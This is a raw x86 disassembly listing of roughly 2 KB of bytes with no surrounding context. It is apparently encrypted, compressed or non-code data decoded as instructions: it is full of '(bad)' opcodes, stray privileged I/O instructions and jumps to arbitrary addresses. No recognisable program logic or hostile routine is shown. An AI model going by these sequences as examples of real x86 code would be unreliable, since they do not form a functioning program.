  4165c6:	fnstenv [eax]
  4165c8:	cmp    BYTE PTR [ebx+edi*4+0x4f],dl
  4165cc:	adc    al,0x5a
  4165ce:	sbb    DWORD PTR [eax+0x6d],ebp
  4165d1:	sbb    eax,0x723883ea
  4165d6:	adc    DWORD PTR [ecx+0x76],0x4f
  4165da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165db:	sbb    DWORD PTR [edi],esp
  4165dd:	jbe    0x41662f
  4165df:	jns    0x416578
  4165e1:	out    0x14,al
  4165e3:	add    bh,bl
  4165e5:	and    eax,0xa6202e72
  4165ea:	add    eax,0x9752d5f3
  4165ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165f0:	(bad)
  4165f3:	ret    0x4156
  4165f6:	int3   
  4165f7:	sub    BYTE PTR [eax+0x23],0xd7
  4165fb:	repz mov bh,0x52
  4165fe:	stos   DWORD PTR es:[edi],eax
  4165ff:	jecxz  0x4165aa
  416601:	icebp  
  416602:	mov    DWORD PTR [ebx+0xbca0609],ebx
  416608:	mov    ch,0xe1
  41660a:	sbb    BYTE PTR [ebx+0x45ab0c82],ch
  416610:	call   0x6db4:0x11a6611e
  416617:	pop    ss
  416618:	mov    bl,0x56
  41661a:	xchg   ebp,eax
  41661b:	mov    ebx,0xb5ed48e5
  416620:	and    BYTE PTR [edx+0x6d515c57],al
  416626:	cmc    
  416627:	jecxz  0x416641
  416629:	jg     0x416609
  41662b:	scas   eax,DWORD PTR es:[edi]
  41662c:	fld    QWORD PTR [ecx-0x7a99ed2d]
  416632:	add    DWORD PTR [esi],ecx
  416634:	sub    eax,esp
  416636:	fwait
  416637:	push   ecx
  416638:	mov    bh,0x60
  41663a:	push   eax
  41663b:	jb     0x4166b0
  41663d:	es ret 
  41663f:	push   ss
  416640:	and    eax,0x35c5006a
  416645:	xor    DWORD PTR [edx-0x392b6686],0x31
  41664c:	push   0xffffffbf
  41664e:	xor    eax,eax
  416650:	repz and edx,ebx
  416653:	sub    DWORD PTR [ebp-0x52],eax
  416656:	retf   
  416657:	mov    eax,0x186ba634
  41665c:	ins    BYTE PTR es:[edi],dx
  41665d:	test   BYTE PTR [eax],dl
  41665f:	xchg   ebp,eax
  416660:	stc    
  416661:	sub    eax,0x98d44f71
  416666:	mov    ebp,0x6fbf2d09
  41666b:	pusha  
  41666c:	and    ah,0x9a
  41666f:	js     0x416686
  416671:	pop    ebp
  416672:	xchg   ebp,eax
  416673:	pop    ds
  416674:	dec    esi
  416675:	push   edi
  416676:	add    bl,BYTE PTR [ebp+0x38]
  416679:	mov    eax,0xa484d1e6
  41667e:	jg     0x41668c
  416680:	mov    ds:0x529fbdef,eax
  416685:	popa   
  416686:	cmp    ebx,DWORD PTR [esi]
  416688:	add    DWORD PTR [edx-0x4c],0x54a32a30
  41668f:	shr    BYTE PTR [ebx+eiz*4+0xcaa138b],0x17
  416697:	push   ds
  416698:	mov    ebp,0xbe4e664e
  41669d:	dec    ecx
  41669e:	mov    dh,cl
  4166a0:	sahf   
  4166a1:	daa    
  4166a2:	jnp    0x41663b
  4166a4:	xor    edx,0x693b92f8
  4166aa:	and    dh,BYTE PTR [esi]
  4166ac:	mov    cl,0x69
  4166ae:	mov    edi,edi
  4166b0:	and    BYTE PTR [eax],dl
  4166b2:	lea    ecx,[ebp-0x5eea9a3a]
  4166b8:	outs   dx,BYTE PTR ds:[esi]
  4166b9:	mov    DWORD PTR [ecx+edi*8],eax
  4166bc:	test   BYTE PTR [edi],dl
  4166be:	xor    DWORD PTR [ebp-0x1a],ecx
  4166c1:	ret    0xee1c
  4166c4:	sub    al,0xe2
  4166c6:	ss lock aas 
  4166c9:	test   bh,al
  4166cb:	repnz push ebx
  4166cd:	(bad)  
  4166ce:	out    dx,al
  4166cf:	call   0x125c8138
  4166d4:	cmp    ebp,0x10
  4166d7:	inc    edx
  4166d8:	popa   
  4166d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166da:	enter  0x7f34,0x6b
  4166de:	retf   0x24ea
  4166e1:	inc    ecx
  4166e2:	dec    edx
  4166e3:	test   DWORD PTR [ebp+ecx*8-0x51cfc60a],edi
  4166ea:	mov    BYTE PTR ds:0x40e207c5,dl
  4166f0:	or     ah,dh
  4166f2:	jne    0x4166ea
  4166f4:	xchg   esp,eax
  4166f5:	sbb    BYTE PTR [eax-0x70021002],0x8b
  4166fc:	dec    ecx
  4166fd:	retf   
  4166fe:	sub    BYTE PTR [edi],dh
  416700:	cli    
  416701:	inc    eax
  416702:	and    BYTE PTR [edi+esi*1+0x7837f708],0x90
  41670a:	sub    DWORD PTR [eax+0x21],ebp
  41670d:	add    DWORD PTR [edx],edx
  41670f:	loope  0x416743
  416711:	or     BYTE PTR [esi+0xb],ah
  416714:	fist   WORD PTR [ecx+edi*1+0x45]
  416718:	push   ds
  416719:	mov    dh,0x6c
  41671b:	sub    al,0x0
  41671d:	adc    BYTE PTR [eax*8+0x54a24192],cl
  416724:	sbb    DWORD PTR [ebx+0x4f4db19c],esp
  41672a:	pop    esp
  41672b:	rcl    BYTE PTR [esi+0x2e],1
  41672e:	ror    DWORD PTR [edi],0xd7
  416731:	sub    al,0x7a
  416733:	jge    0x41674c
  416735:	fdiv   QWORD PTR [eax+0x3e7c3cea]
  41673b:	loope  0x416755
  41673d:	dec    esi
  41673e:	pusha  
  41673f:	pop    ss
  416740:	popa   
  416741:	cmp    dl,BYTE PTR [ebp-0x12]
  416744:	or     al,0xec
  416746:	je     0x416762
  416748:	in     al,dx
  416749:	test   al,0xdc
  41674b:	out    0xb9,al
  41674d:	mov    bh,0xf9
  41674f:	jecxz  0x416773
  416751:	xor    bl,BYTE PTR [esi+eax*1-0x4b2d607c]
  416758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416759:	mov    ecx,0xe580524f
  41675e:	aas    
  41675f:	jge    0x4167d6
  416761:	shl    DWORD PTR [edx-0x10],cl
  416764:	and    eax,0x4884611b
  416769:	add    al,0xc2
  41676b:	clc    
  41676c:	add    al,0xe1
  41676e:	xchg   ecx,eax
  41676f:	mov    dl,0x29
  416771:	dec    eax
  416772:	pop    edi
  416773:	push   0x5
  416775:	fbstp  TBYTE PTR [eax-0x21]
  416778:	mov    ss,WORD PTR [ebx-0x6cdc33a8]
  41677e:	sub    BYTE PTR [ecx+ebx*2+0x75],cl
  416782:	mov    bl,0x98
  416784:	adc    ah,bl
  416786:	xchg   edx,eax
  416787:	jb     0x4167f3
  416789:	aam    0x72
  41678b:	xor    ah,BYTE PTR [ecx-0x59a36d4]
  416791:	or     DWORD PTR ds:0x9eda027d,esi
  416797:	xor    al,0x55
  416799:	fdivr  DWORD PTR [esi-0x3f86c7b0]
  41679f:	push   ecx
  4167a0:	fist   WORD PTR [ebp-0x7e]
  4167a3:	jo     0x416795
  4167a5:	or     bl,BYTE PTR [ebx]
  4167a7:	repz in al,0x25
  4167aa:	lea    ebx,[ecx+ebp*1+0x61]
  4167ae:	test   DWORD PTR [ecx],edx
  4167b0:	or     esp,DWORD PTR ds:[edx+0x33]
  4167b4:	bound  eax,QWORD PTR [ecx+0x11]
  4167b7:	scas   eax,DWORD PTR es:[edi]
  4167b8:	(bad)  [ebp+0x7d27feb2]
  4167be:	imul   edi,edi,0x5cc16836
  4167c4:	push   es
  4167c5:	jo     0x4167ad
  4167c7:	arpl   WORD PTR [edx+0x67],cx
  4167ca:	test   al,0x26
  4167cc:	aam    0x4b
  4167ce:	std    
  4167cf:	test   BYTE PTR [eax-0x41],dh
  4167d2:	pushf  
  4167d3:	mov    edx,0x1798a87c
  4167d8:	enter  0xd3bd,0x24
  4167dc:	xchg   ebx,eax
  4167dd:	pop    esi
  4167de:	pop    eax
  4167df:	in     eax,dx
  4167e0:	sub    DWORD PTR [ecx-0x7],edx
  4167e3:	and    eax,0xc36a192d
  4167e8:	out    0xaa,al
  4167ea:	mov    esi,0x9297105b
  4167ef:	(bad)  
  4167f0:	xor    DWORD PTR [ecx-0x7ee07cfa],0xbd01d10a
  4167fa:	jmp    0xbb75:0x37702d8e
  416801:	lods   al,BYTE PTR ds:[esi]
  416802:	dec    ebx
  416803:	(bad)  
  416804:	shl    BYTE PTR gs:[edx+0x21f6a9e3],cl
  41680b:	sti    
  41680c:	adc    ch,BYTE PTR [ebx+0x68]
  41680f:	sub    eax,0xd912ce88
  416814:	push   es
  416815:	jl     0x41681a
  416817:	out    dx,eax
  416818:	mov    eax,DWORD PTR [edx+0x4f3c0409]
  41681e:	out    0x7d,al
  416820:	je     0x416858
  416822:	sti    
  416823:	mov    ch,0xa0
  416825:	aas    
  416826:	lock dec eax
  416828:	jmp    0x5b1f0d4f
  41682d:	lods   eax,DWORD PTR ds:[esi]
  41682e:	(bad)  
  41682f:	pop    ecx
  416830:	loop   0x416887
  416832:	hlt    
  416833:	jmp    0x416826
  416835:	test   eax,0x7337c5a6
  41683a:	mov    al,ds:0xaf7913f8
  41683f:	test   ch,dh
  416841:	add    esp,DWORD PTR [esp+edi*8+0x1641cc2]
  416848:	out    0x83,eax
  41684a:	ret    0x966b
  41684d:	out    0x64,eax
  41684f:	inc    esp
  416850:	adc    edi,DWORD PTR [ebp+0x4d]
  416853:	dec    edx
  416854:	sahf   
  416855:	or     al,BYTE PTR [ebx-0x1d]
  416858:	mov    edi,0xd860f4aa
  41685d:	pop    esp
  41685e:	mov    ecx,0x4ca42612
  416863:	je     0x41688a
  416865:	push   edx
  416866:	xchg   edx,eax
  416867:	(bad)  
  416868:	xchg   edi,eax
  416869:	mov    al,0x4d
  41686b:	(bad)  
  41686c:	into   
  41686d:	fdiv   DWORD PTR [edi-0x3de11853]
  416873:	dec    ecx
  416874:	add    DWORD PTR [ebx+0x2d],edi
  416877:	pop    edi
  416878:	lods   al,BYTE PTR ds:[esi]
  416879:	xor    DWORD PTR [esi-0x3],0x39e28b4f
  416880:	jp     0x416873
  416882:	cwde   
  416883:	hlt    
  416884:	add    eax,0x7c5e5cf1
  416889:	sub    BYTE PTR [eax+0xb],0x7c
  41688d:	add    eax,0x4bbfc7d7
  416892:	fst    QWORD PTR [esi+0x59090cfe]
  416898:	rcr    BYTE PTR [edx-0x23],cl
  41689b:	lods   al,BYTE PTR ds:[esi]
  41689c:	xor    edi,ebx
  41689e:	clc    
  41689f:	xor    DWORD PTR [ebp+0x27],ecx
  4168a2:	(bad)  
  4168a3:	std    
  4168a4:	adc    DWORD PTR [edx-0x61eaf793],esp
  4168aa:	lds    edi,FWORD PTR [edx]
  4168ac:	or     ah,BYTE PTR [ebp-0x73898e9b]
  4168b2:	add    BYTE PTR [ebx-0x3ea4b0cc],0xc6
  4168b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168ba:	popa   
  4168bb:	cli    
  4168bc:	mov    bl,0x24
  4168be:	mov    cl,BYTE PTR [edx+0x203016fb]
  4168c4:	cdq    
  4168c5:	xor    al,BYTE PTR [ecx+0x75b1d6ad]
  4168cb:	mov    eax,ds:0xbaf6a8e2
  4168d0:	push   eax
  4168d1:	and    esp,0xffffffe1
  4168d4:	sar    DWORD PTR fs:[edi+0x18],0xbb
  4168d9:	(bad)  
  4168da:	ror    DWORD PTR [ebx+edi*8],cl
  4168dd:	jns    0x416957
  4168df:	xor    eax,0xa746ed6b
  4168e4:	mov    edi,0x7c71bd57
  4168e9:	iret   
  4168ea:	fiadd  WORD PTR [ebp+0x58]
  4168ed:	test   eax,0xe6c6f570
  4168f2:	xor    al,0x8f
  4168f4:	loopne 0x4168b4
  4168f6:	dec    ebp
  4168f7:	arpl   WORD PTR [edx+0xd91ac4b],si
  4168fd:	cmp    DWORD PTR [edi+edx*8+0x508879f7],esi
  416904:	cdq    
  416905:	mov    edi,0x4f6c90a4
  41690a:	fwait
  41690b:	pusha  
  41690c:	aaa    
  41690d:	std    
  41690e:	xor    cl,bh
  416910:	ss dec eax
  416912:	inc    edi
  416913:	lods   al,BYTE PTR ds:[esi]
  416914:	mov    eax,ds:0x4776c859
  416919:	or     DWORD PTR [edx],eax
  41691b:	out    dx,eax
  41691c:	xor    al,0x58
  41691e:	adc    ecx,eax
  416920:	dec    esi
  416921:	test   al,0x72
  416923:	pop    esi
  416924:	dec    esi
  416925:	xchg   edx,eax
  416926:	shr    bh,0x85
  416929:	cmp    edi,DWORD PTR [edi+eax*2]
  41692c:	iret   
  41692d:	test   al,0x26
  41692f:	ss out dx,al
  416931:	popa   
  416932:	test   DWORD PTR ds:0x749c16fe,ebx
  416938:	clc    
  416939:	and    eax,0x77822c09
  41693e:	xor    BYTE PTR es:[edx+ebx*8],0x48
  416943:	fdivrp st(7),st
  416945:	xchg   ecx,eax
  416946:	into   
  416947:	jg     0x41692f
  416949:	adc    al,0x50
  41694b:	jmp    0x7a29c2a5
  416950:	dec    esp
  416951:	loopne 0x416903
  416953:	dec    ebx
  416954:	jg     0x416939
  416956:	xchg   BYTE PTR [eax+0x1b5523f3],bh
  41695c:	ret    
  41695d:	and    cl,BYTE PTR [esi]
  41695f:	lea    ebp,[ecx-0x75c9d21d]
  416965:	mov    ch,0xb7
  416967:	ins    BYTE PTR es:[edi],dx
  416968:	imul   ebx,DWORD PTR [eax+0x79937b57],0x185f51bc
  416972:	push   esi
  416973:	test   DWORD PTR [eax-0x744ca7a2],0x1720435d
  41697d:	push   edx
  41697e:	mov    edx,0x56dfcb84
  416983:	sbb    eax,0x88bfc874
  416988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416989:	pop    ss
  41698a:	or     BYTE PTR [esi+edx*8-0x2db6ea82],0x5b
  416992:	jnp    0x41698e
  416994:	push   es
  416995:	mov    BYTE PTR [ecx+0x6117cbb9],cl
  41699b:	xor    al,0x3c
  41699d:	mov    BYTE PTR [ebp-0x7d5d31cd],bh
  4169a3:	fdiv   DWORD PTR [edx]
  4169a5:	adc    eax,0xc0a9fac5
  4169aa:	not    BYTE PTR ss:[edi-0x66358fd0]
  4169b1:	rsm    
  4169b3:	xor    eax,0x5fdf4aed
  4169b8:	dec    ebp
  4169b9:	add    ah,BYTE PTR [ebp-0x2a92a20f]
  4169bf:	xchg   edx,eax
  4169c0:	adc    BYTE PTR [edi+0x24180c4b],ah
  4169c6:	loopne 0x4169df
  4169c8:	retf   0x9dc1
  4169cb:	int    0xcb
  4169cd:	pop    ds
  4169ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169cf:	pop    ecx
  4169d0:	sub    edi,eax
  4169d2:	adc    ch,ch
  4169d4:	mov    esi,0x734b63e4
  4169d9:	xor    al,0xdc
  4169db:	dec    esp
  4169dc:	or     esp,ecx
  4169de:	fcomp  DWORD PTR [esi-0x5b]
  4169e1:	dec    eax
  4169e2:	(bad)  
  4169e3:	outs   dx,BYTE PTR ds:[esi]
  4169e4:	push   esp
  4169e5:	pop    ecx
  4169e6:	sub    eax,DWORD PTR [esi+edx*4+0x79]
  4169ea:	ja     0x41696e
  4169ec:	retf   
  4169ed:	int3   
  4169ee:	xchg   esp,eax
  4169ef:	adc    DWORD PTR [ebp-0x3b],0x81faeaff
  4169f6:	out    dx,al
  4169f7:	scas   eax,DWORD PTR es:[edi]
  4169f8:	scas   al,BYTE PTR es:[edi]
  4169f9:	adc    al,BYTE PTR ds:0x1ece2411
  4169ff:	int3   
  416a00:	push   ss
  416a01:	mov    eax,0xc216838c
  416a06:	pop    ds
  416a07:	xchg   DWORD PTR [ebp+0x5bc90514],edi
  416a0d:	dec    ebx
  416a0e:	dec    ebp
  416a0f:	jo     0x416a3b
  416a11:	mov    dl,0xad
  416a13:	pusha  
  416a14:	loope  0x416a82
  416a16:	scas   al,BYTE PTR es:[edi]
  416a17:	add    eax,0x85c7bd32
  416a1c:	xor    eax,0xaf8ee8d4
  416a21:	sub    DWORD PTR [edx+0x1e],0x45f552e5
  416a28:	or     eax,DWORD PTR [edi]
  416a2a:	push   eax
  416a2b:	div    BYTE PTR ds:0x30eb9bf6
  416a31:	or     DWORD PTR [edx+0x26],0xffffff8a
  416a35:	loopne 0x416a72
  416a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a38:	xchg   esp,eax
  416a39:	test   ecx,ebp
  416a3b:	clc    
  416a3c:	push   cs
  416a3d:	and    BYTE PTR [esi-0x5d52a4e9],ch
  416a43:	sbb    DWORD PTR [esi+0x3d1622d7],esp
  416a49:	cmp    eax,DWORD PTR [ebp-0x6c]
  416a4c:	push   esi
  416a4d:	add    eax,0x57becf64
  416a52:	sub    eax,0x93059cb
  416a57:	mov    ecx,0x950def43
  416a5c:	out    0x28,al
  416a5e:	arpl   WORD PTR [edx],bx
  416a60:	data16 xlat BYTE PTR ds:[ebx]
  416a62:	push   0x4c4ef086
  416a67:	aaa    
  416a68:	jnp    0x416ad6
  416a6a:	pop    edi
  416a6b:	push   edi
  416a6c:	pop    ebx
  416a6d:	mov    ebx,0x735d367e
  416a72:	inc    edi
  416a73:	div    DWORD PTR [ecx-0x53]
  416a76:	addr16 lahf 
  416a78:	inc    esp
  416a79:	clc    
  416a7a:	fdivr  QWORD PTR [edi+ebx*2-0xf]
  416a7e:	xchg   ebp,eax
  416a7f:	push   ax
  416a81:	add    al,0x14
  416a83:	in     eax,0xb0
  416a85:	shl    BYTE PTR [ebp+0x374abf8a],cl
  416a8b:	int    0x7d
  416a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a8e:	or     edi,DWORD PTR [ebx]
  416a90:	je     0x416a79
  416a92:	push   0x2a4cc0b3
  416a97:	(bad)  
  416a98:	imul   ecx,edi,0x73
  416a9b:	pop    esp
  416a9c:	aas    
  416a9d:	add    DWORD PTR [ecx-0x3e3f6417],edx
  416aa3:	cs mov ch,0xa3
  416aa6:	test   BYTE PTR [edi],0x62
  416aa9:	mov    al,0xb9
  416aab:	hlt    
  416aac:	xchg   esi,eax
  416aad:	sbb    al,0x16
  416aaf:	(bad)  
  416ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ab1:	jo     0x416a91
  416ab3:	or     eax,0xe60d300f
  416ab8:	dec    ebx
  416ab9:	pop    edx
  416aba:	ds pop ebx
  416abc:	xor    eax,0xc013e615
  416ac1:	cmp    DWORD PTR [edx],esi
  416ac3:	scas   al,BYTE PTR es:[edi]
  416ac4:	adc    ebx,edx
  416ac6:	push   ebx
  416ac7:	xor    cl,BYTE PTR [ecx]
  416ac9:	hlt    
  416aca:	test   DWORD PTR [ebx+0x6f3f183f],esi
  416ad0:	inc    esp
  416ad1:	int3   
  416ad2:	xchg   BYTE PTR [ebp-0x2],dl
  416ad5:	push   ecx
  416ad6:	push   ebx
  416ad7:	push   esi
  416ad8:	jg     0x416b1e
  416ada:	ja     0x416a81
  416adc:	fld    DWORD PTR [edx+0x2c]
  416adf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ae0:	mov    ch,0xac
  416ae2:	jmp    0x29601a3c
  416ae7:	leave  
  416ae8:	mov    eax,0xa15046f0
  416aed:	ins    DWORD PTR es:[edi],dx
  416aee:	int    0xd0
  416af0:	imul   esp,DWORD PTR [ecx],0xffffffdc
  416af3:	mov    esp,0x2b42ab4f
  416af8:	xor    ebx,DWORD PTR [ebx+0x2b]
  416afb:	inc    ecx
  416afc:	(bad)  
  416afd:	imul   ecx,DWORD PTR [ecx-0x496c3ff3],0xdf577771
  416b07:	fwait
  416b08:	add    eax,0x8bdc97e8
  416b0d:	pop    ss
  416b0e:	adc    DWORD PTR [edx-0x77472137],esp
  416b14:	in     eax,0x60
  416b16:	and    BYTE PTR [esi+0x48f2a6ac],bl
  416b1c:	push   edx
  416b1d:	movntq QWORD PTR [ecx],mm7
  416b20:	imul   esp,DWORD PTR [ecx+0x26],0x4c6ba27b
  416b27:	xchg   ebp,eax
  416b28:	xchg   esp,eax
  416b29:	in     eax,dx
  416b2a:	adc    al,0x8c
  416b2c:	sbb    ch,BYTE PTR [edx+edx*2]
  416b2f:	pop    es
  416b30:	inc    eax
  416b31:	sbb    ebp,DWORD PTR [edi-0x7d]
  416b34:	nop
  416b35:	retf   0xe0be
  416b38:	stos   BYTE PTR es:[edi],al
  416b39:	pop    esi
  416b3a:	cld    
  416b3b:	inc    esp
  416b3c:	jnp    0x416b2a
  416b3e:	fistp  DWORD PTR [edx]
  416b40:	clc    
  416b41:	jmp    0xb5f7d6e4
  416b46:	fs and ebx,edx
  416b49:	out    0xd6,eax
  416b4b:	sar    dh,cl
  416b4d:	mov    esp,0xde24facd
  416b52:	cmp    BYTE PTR [edx-0x2ba18075],dl
  416b58:	fsubr  st(0),st
  416b5a:	cwde   
  416b5b:	test   DWORD PTR [ecx],esi
  416b5d:	stos   DWORD PTR es:[edi],eax
  416b5e:	js     0x416bd3
  416b60:	and    edx,edi
  416b62:	xchg   BYTE PTR [eax-0x17],bh
  416b65:	xchg   esp,eax
  416b66:	clc    
  416b67:	xor    al,BYTE PTR [edi]
  416b69:	pop    eax
  416b6a:	dec    eax
  416b6b:	add    ah,dl
  416b6d:	cmp    DWORD PTR [esi-0x5087138d],edi
  416b73:	sub    al,bh
  416b75:	mov    esp,DWORD PTR [edx-0x1797eeee]
  416b7b:	cdq    
  416b7c:	xchg   esp,eax
  416b7d:	ror    BYTE PTR [edx-0x6b],1
  416b80:	dec    ebp
  416b81:	stos   BYTE PTR es:[edi],al
  416b82:	(bad)  
  416b83:	mov    esp,0x4b437f3b
  416b88:	mov    eax,ds:0xeb3973c7
  416b8d:	xchg   ebp,eax
  416b8e:	mov    eax,0x83bee41b
  416b93:	xchg   ebp,eax
  416b94:	fs pop esi
  416b96:	mov    ecx,0xdd7d735e
  416b9b:	sub    BYTE PTR [eax+edx*2+0x522b253d],ch
  416ba2:	xchg   ecx,eax
  416ba3:	xlat   BYTE PTR ds:[ebx]
  416ba4:	mov    ecx,0x94ef02f1
  416ba9:	mov    BYTE PTR [ebx-0x10ba4a40],ch
  416baf:	int3   
  416bb0:	call   0x1de8:0x7b088bd3
  416bb7:	(bad)  
  416bb8:	sti    
  416bb9:	sub    BYTE PTR [edi+edx*1+0x7a],cl
  416bbd:	and    ch,BYTE PTR [eax+0x39]
  416bc0:	dec    esi
  416bc1:	out    dx,al
  416bc2:	or     eax,0xb6616e70
  416bc7:	sbb    DWORD PTR [ebx],ecx
  416bc9:	fld    DWORD PTR [edi]
  416bcb:	pop    edi
  416bcc:	daa    
  416bcd:	imul   esi,DWORD PTR [eax+0x52530419],0x77
  416bd4:	je     0x416bfb
  416bd6:	mov    BYTE PTR [ecx+0x7496ad95],dh
  416bdc:	ret    0xc053
  416bdf:	and    al,0xa9
  416be1:	dec    edx
  416be2:	and    al,0x4b
  416be4:	ja     0x416ba5
  416be6:	mov    edx,0xdf4c1acc
  416beb:	or     eax,DWORD PTR [esi+ebp*8]
  416bee:	jno    0x416bce
  416bf0:	cmp    al,0xe1
  416bf2:	and    ebp,ecx
  416bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bf5:	sti    
  416bf6:	ds sub eax,0x9640d0cc
  416bfc:	test   eax,0xd4d9c3fa
  416c01:	(bad)  
  416c02:	xlat   BYTE PTR ds:[ebx]
  416c03:	mov    esi,0xda3a73a8
  416c08:	dec    eax
  416c09:	adc    eax,esi
  416c0b:	or     BYTE PTR [edx-0x7f],0xbc
  416c0f:	sub    BYTE PTR [ebp+0x58a2aca4],bh
  416c15:	jl     0x416c8e
  416c17:	es cdq 
  416c19:	xor    bh,BYTE PTR [ebx-0x1f]
  416c1c:	imul   eax,DWORD PTR [ebp+0x7b],0x273223a3
  416c23:	jp     0x416c3d
  416c25:	or     BYTE PTR [ebp+eiz*1-0x221916fd],0x74
  416c2d:	push   ecx
  416c2e:	jb     0x416c16
  416c30:	out    dx,eax
  416c31:	inc    esi
  416c32:	mov    ecx,0x8c72d519
  416c37:	imul   ebx,esi,0x74b17110
  416c3d:	shl    DWORD PTR [esi+0x55],cl
  416c40:	das    
  416c41:	pop    es
  416c42:	(bad)  
  416c43:	push   ebp
  416c44:	ja     0x416c95
  416c46:	dec    edx
  416c47:	pushf  
  416c48:	mov    ebx,0xb8e6753e
  416c4d:	or     DWORD PTR [esi],0x5317e452
  416c53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c54:	sbb    DWORD PTR [ebx],ebp
  416c56:	xchg   BYTE PTR [eax],dh
  416c58:	xchg   edi,eax
  416c59:	cmp    edi,DWORD PTR [ecx]
  416c5b:	jp     0x416cd7
  416c5d:	pop    es
  416c5e:	shl    DWORD PTR [ebp-0x24],cl
  416c61:	adc    ecx,DWORD PTR [ecx]
  416c63:	adc    eax,0x19d7db9e
  416c68:	cmp    dl,cl
  416c6a:	sbb    edi,DWORD PTR [edi-0x42]
  416c6d:	ins    DWORD PTR es:[edi],dx
  416c6e:	rol    BYTE PTR [esi+0x1b7590f2],cl
  416c74:	out    dx,al
  416c75:	dec    ebp
  416c76:	xchg   ebx,eax
  416c77:	pop    es
  416c78:	cmp    DWORD PTR [ebx],ebp
  416c7a:	popf   
  416c7b:	sbb    ch,BYTE PTR [eax+0x3b]
  416c7e:	inc    ebp
  416c7f:	(bad)  
  416c81:	inc    eax
  416c82:	sahf   
  416c83:	jecxz  0x416cdf
  416c85:	ret    
  416c86:	jmp    0xed5d:0xaf3b6e0d
  416c8d:	popa   
  416c8e:	mov    eax,0x2d8b9478
  416c93:	(bad)
  416c96:	sbb    esp,esp
  416c98:	pushf  
  416c99:	cld    
  416c9a:	fldenv [edx]
  416c9c:	bnd ss jb 0x416c85
  416ca0:	lahf   
  416ca1:	push   cs
  416ca2:	call   0xb701:0x55b40096
  416ca9:	pop    esi
  416caa:	cld    
  416cab:	outs   dx,BYTE PTR ds:[esi]
  416cac:	push   esp
  416cad:	pop    esp
  416cae:	das    
  416caf:	xchg   edx,eax
  416cb0:	enter  0x7eb8,0xf1
  416cb4:	lock out dx,al
  416cb6:	repnz (bad) 
  416cb8:	fmul   DWORD PTR [ecx+0x32e82232]
  416cbe:	or     eax,0xfc02c170
  416cc3:	pop    ebx
  416cc4:	enter  0xbfee,0x7a
  416cc8:	sub    BYTE PTR [edx],bh
  416cca:	push   cs
  416ccb:	popf   
  416ccc:	imul   esi,esi,0x1865809
  416cd2:	cwde   
  416cd3:	add    al,0x3b
  416cd5:	lods   al,BYTE PTR ds:[esi]
  416cd6:	imul   eax,DWORD PTR [ecx-0x11],0xffffffdf
  416cda:	sub    eax,0xb3f9a205
  416cdf:	(bad)  
  416ce0:	arpl   sp,dx
  416ce2:	lea    edi,[ecx]
  416ce4:	out    dx,al
  416ce5:	push   esp
  416ce6:	cmp    eax,0xc9797f48
  416ceb:	mov    al,0x8a
  416ced:	mov    esp,edi
  416cef:	test   ebx,esi
  416cf1:	mov    ah,0x2b
  416cf3:	int3   
  416cf4:	lock jp 0x416d0f
  416cf7:	jge    0x416d75
  416cf9:	ror    DWORD PTR [esi+0x61],0xcd
  416cfd:	lock add BYTE PTR ds:0xfcb38bb5,ah
  416d04:	outs   dx,BYTE PTR ds:[esi]
  416d05:	jb     0x416d78
  416d07:	and    eax,0x4c324dbc
  416d0c:	xchg   esi,eax
  416d0d:	jno    0x416ceb
  416d0f:	sbb    esp,DWORD PTR [ebp-0x6bc840]
  416d15:	push   ds
  416d16:	and    dl,ah
  416d18:	call   DWORD PTR [eax-0x65]
  416d1b:	clc    
  416d1c:	push   ds
  416d1d:	aad    0xc0
  416d1f:	cli    
  416d20:	mov    ds:0x95248c8b,al
  416d25:	mov    bh,dl
  416d27:	inc    edx
  416d28:	or     ah,dh
  416d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d2b:	jae    0x416d99
  416d2d:	mov    ah,bl
  416d2f:	mov    al,ds:0x2305da
  416d34:	xor    eax,0xf2f3d6db
  416d39:	shr    ebp,cl
  416d3b:	arpl   WORD PTR [edx-0x64],dx
  416d3e:	mov    ecx,0x35d1ec5d
  416d43:	cmp    esi,DWORD PTR [ebx]
  416d45:	inc    esi
  416d46:	les    ebp,FWORD PTR [edi+0x7230a5b0]
  416d4c:	nop
  416d4d:	pop    ecx
  416d4e:	mov    ah,0x46
  416d50:	mov    dl,0x78
  416d52:	psrld  mm1,mm5
  416d55:	lock loope 0x416d70
  416d58:	(bad)  
  416d59:	and    al,BYTE PTR [ebx+edi*2]
  416d5c:	inc    eax
  416d5d:	stos   DWORD PTR es:[edi],eax
  416d5e:	xchg   edx,eax
  416d5f:	pop    esp
  416d60:	dec    edx
  416d61:	cli    
  416d62:	cmp    DWORD PTR [ecx+ebx*1-0x66388a35],ecx
  416d69:	jbe    0x416cfb
  416d6b:	cmp    al,0x19
  416d6d:	js     0x416d9f
  416d6f:	dec    edx
  416d70:	mov    al,0x42
  416d72:	mov    ecx,0xba80d733
  416d77:	push   edx
  416d78:	adc    dh,cl
  416d7a:	push   ebp
  416d7b:	fbld   TBYTE PTR [esi+0x4e25442c]
  416d81:	cmp    al,0x5e
  416d83:	dec    ebp
  416d84:	inc    ebx
  416d85:	cli    
  416d86:	add    eax,0xabfa600
  416d8b:	jle    0x416d88
  416d8d:	mov    ds:0x80a3e580,eax
  416d92:	into   
  416d93:	lods   al,BYTE PTR ds:[esi]
  416d94:	ret    
  416d95:	ss out 0x6,eax
  416d98:	jmp    0xb5e61f19
  416d9d:	lahf   
  416d9e:	add    eax,0xc6be5489
  416da3:	xchg   ebp,eax
  416da4:	ficom  DWORD PTR [edx-0x193f5a6d]
  416daa:	xor    al,0x22
  416dac:	sti    
  416dad:	cld    
  416dae:	sub    DWORD PTR [ecx+eax*4],edi
  416db1:	xchg   esi,eax
  416db2:	adc    al,0x56
  416db4:	sub    al,0xce
  416db6:	in     al,0x13
